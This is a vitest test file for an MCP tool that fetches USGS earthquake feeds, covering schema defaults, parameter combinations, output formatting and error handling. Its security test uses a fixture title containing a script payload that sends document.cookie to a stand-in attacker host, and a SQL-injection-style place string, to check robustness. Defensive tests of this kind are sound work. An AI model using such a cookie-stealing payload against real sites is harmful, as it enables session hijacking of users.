/**
 * @fileoverview Edge-case and boundary tests for the earthquake-get-feed tool.
 * @module tests/tools/earthquake-get-feed-edge-cases.test
 */

import { createMockContext } from '@cyanheads/mcp-ts-core/testing';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { earthquakeGetFeed } from '@/mcp-server/tools/definitions/earthquake-get-feed.tool.js';
import type { EarthquakeEventOutput } from '@/mcp-server/tools/schemas.js';
import * as usgsModule from '@/services/usgs/usgs-service.js';

const baseEvent: EarthquakeEventOutput = {
  id: 'us7654321',
  title: 'M 4.5 - Pacific Ocean',
  magnitude: 4.5,
  magnitude_type: 'mb',
  time: '2026-05-01T00:00:00.000Z',
  updated: '2026-05-01T00:10:00.000Z',
  place: 'Pacific Ocean',
  latitude: 0.0,
  longitude: 180.0,
  depth_km: 20,
  felt: null,
  cdi: null,
  mmi: null,
  alert: null,
  tsunami: 0,
  significance: null,
  status: 'automatic',
};

describe('earthquakeGetFeed — input schema', () => {
  it('applies default magnitude_tier=2.5', () => {
    expect(earthquakeGetFeed.input.parse({}).magnitude_tier).toBe('2.5');
  });

  it('applies default time_window=day', () => {
    expect(earthquakeGetFeed.input.parse({}).time_window).toBe('day');
  });

  it('rejects invalid magnitude_tier', () => {
    expect(() => earthquakeGetFeed.input.parse({ magnitude_tier: '3.0' as never })).toThrow();
  });

  it('rejects invalid time_window', () => {
    expect(() => earthquakeGetFeed.input.parse({ time_window: 'year' as never })).toThrow();
  });

  it('accepts all valid magnitude_tier values', () => {
    for (const tier of ['all', '1.0', '2.5', '4.5', 'significant'] as const) {
      const input = earthquakeGetFeed.input.parse({ magnitude_tier: tier });
      expect(input.magnitude_tier).toBe(tier);
    }
  });

  it('accepts all valid time_window values', () => {
    for (const window of ['hour', 'day', 'week', 'month'] as const) {
      const input = earthquakeGetFeed.input.parse({ time_window: window });
      expect(input.time_window).toBe(window);
    }
  });
});

describe('earthquakeGetFeed — all magnitude/window combinations', () => {
  let mockGetFeed: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    mockGetFeed = vi.fn();
    vi.spyOn(usgsModule, 'getUsgsService').mockReturnValue({
      getFeed: mockGetFeed,
    } as unknown as usgsModule.UsgsService);
  });

  it('calls service for every valid magnitude/window combination', async () => {
    const tiers = ['all', '1.0', '2.5', '4.5', 'significant'] as const;
    const windows = ['hour', 'day', 'week', 'month'] as const;

    mockGetFeed.mockResolvedValue({
      events: [],
      generatedAt: '2026-05-01T00:00:00.000Z',
      count: 0,
      feedUrl: 'https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/all_hour.geojson',
    });

    const ctx = createMockContext();
    let callCount = 0;

    for (const tier of tiers) {
      for (const window of windows) {
        const input = earthquakeGetFeed.input.parse({ magnitude_tier: tier, time_window: window });
        await earthquakeGetFeed.handler(input, ctx);
        callCount++;
      }
    }

    // 5 tiers * 4 windows = 20 combinations
    expect(mockGetFeed).toHaveBeenCalledTimes(20);
    expect(callCount).toBe(20);
  });
});

describe('earthquakeGetFeed — security', () => {
  let mockGetFeed: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    mockGetFeed = vi.fn();
    vi.spyOn(usgsModule, 'getUsgsService').mockReturnValue({
      getFeed: mockGetFeed,
    } as unknown as usgsModule.UsgsService);
  });

  it('handles injection-like content in feed event titles without crashing', async () => {
    const injectionEvent: EarthquakeEventOutput = {
      ...baseEvent,
      title: '<script>fetch("https://attacker.com?cookie="+document.cookie)</script>',
      place: "NORTHERN EUROPE'; --",
    };

    mockGetFeed.mockResolvedValue({
      events: [injectionEvent],
      generatedAt: '2026-05-01T00:00:00.000Z',
      count: 1,
      feedUrl: 'https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/2.5_day.geojson',
    });

    const ctx = createMockContext();
    const input = earthquakeGetFeed.input.parse({ magnitude_tier: '2.5', time_window: 'day' });
    const result = await earthquakeGetFeed.handler(input, ctx);

    // Data is returned as-is — the handler does not sanitize, but must not throw
    expect(result.events[0]?.title).toContain('<script>');
    expect(result.events[0]?.place).toContain('NORTHERN EUROPE');

    // format() must also not throw on the injection content
    const blocks = earthquakeGetFeed.format!({
      count: 1,
      generated_at: '2026-05-01T00:00:00.000Z',
      events: [injectionEvent],
      feed_url: 'https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/2.5_day.geojson',
    });
    expect(blocks).toHaveLength(1);
  });
});

describe('earthquakeGetFeed — format edge cases', () => {
  it('includes feed_url in format output', () => {
    const feedUrl = 'https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/4.5_week.geojson';
    const output = {
      count: 1,
      generated_at: '2026-05-01T00:00:00.000Z',
      events: [baseEvent],
      feed_url: feedUrl,
    };
    const blocks = earthquakeGetFeed.format!(output);
    const text = (blocks[0] as { text: string }).text;
    expect(text).toContain(feedUrl);
  });

  it('includes generated_at timestamp in format output', () => {
    const output = {
      count: 1,
      generated_at: '2026-05-01T00:00:00.000Z',
      events: [baseEvent],
      feed_url: 'https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/2.5_day.geojson',
    };
    const blocks = earthquakeGetFeed.format!(output);
    const text = (blocks[0] as { text: string }).text;
    expect(text).toContain('2026-05-01T00:00:00.000Z');
  });

  it('includes count in format output', () => {
    const output = {
      count: 7,
      generated_at: '2026-05-01T00:00:00.000Z',
      events: [baseEvent],
      feed_url: 'https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/2.5_day.geojson',
    };
    const blocks = earthquakeGetFeed.format!(output);
    const text = (blocks[0] as { text: string }).text;
    expect(text).toContain('7');
  });
});

describe('earthquakeGetFeed — feed_unavailable error contract (issue #14)', () => {
  let mockGetFeed: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    mockGetFeed = vi.fn();
    vi.spyOn(usgsModule, 'getUsgsService').mockReturnValue({
      getFeed: mockGetFeed,
    } as unknown as usgsModule.UsgsService);
  });

  it('converts ServiceUnavailable McpError to typed contract error with data.reason', async () => {
    const { McpError, JsonRpcErrorCode } = await import('@cyanheads/mcp-ts-core/errors');
    mockGetFeed.mockRejectedValue(
      new McpError(JsonRpcErrorCode.ServiceUnavailable, 'USGS feed returned HTML', {}),
    );

    const ctx = createMockContext({ errors: earthquakeGetFeed.errors });
    const input = earthquakeGetFeed.input.parse({});
    await expect(earthquakeGetFeed.handler(input, ctx)).rejects.toMatchObject({
      code: JsonRpcErrorCode.ServiceUnavailable,
      data: { reason: 'feed_unavailable' },
    });
  });

  it('re-throws non-ServiceUnavailable McpError unchanged', async () => {
    const { McpError, JsonRpcErrorCode } = await import('@cyanheads/mcp-ts-core/errors');
    mockGetFeed.mockRejectedValue(new McpError(JsonRpcErrorCode.Timeout, 'Feed timed out', {}));

    const ctx = createMockContext({ errors: earthquakeGetFeed.errors });
    const input = earthquakeGetFeed.input.parse({});
    await expect(earthquakeGetFeed.handler(input, ctx)).rejects.toMatchObject({
      code: JsonRpcErrorCode.Timeout,
    });
    await expect(earthquakeGetFeed.handler(input, ctx)).rejects.not.toMatchObject({
      data: { reason: 'feed_unavailable' },
    });
  });

  it('re-throws plain errors unchanged', async () => {
    mockGetFeed.mockRejectedValue(new Error('boom'));

    const ctx = createMockContext({ errors: earthquakeGetFeed.errors });
    const input = earthquakeGetFeed.input.parse({});
    await expect(earthquakeGetFeed.handler(input, ctx)).rejects.toThrow('boom');
  });
});
